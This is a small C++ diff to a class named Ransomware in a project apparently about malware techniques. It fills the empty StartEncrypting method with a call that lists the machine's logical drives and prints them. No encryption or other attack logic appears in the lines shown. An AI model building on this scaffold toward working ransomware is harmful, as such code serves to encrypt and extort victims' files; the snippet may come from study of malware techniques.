@@ -1,6 +1,10 @@
 #include "ransomware.h"
 #include "../MalwareTechniques/ntdll.h"
+#include "../Logger/logger.h"
 
+#include <iostream>
+
+#include <Windows.h>
 
 namespace maltech {
 
@@ -12,7 +16,8 @@ namespace maltech {
         }
 
         void Ransomware::StartEncrypting() {
-
+            DWORD drivers = GetLogicalDrives();
+            std::cout << "Found drivers: " << drivers << std::endl;
         }
 
     }
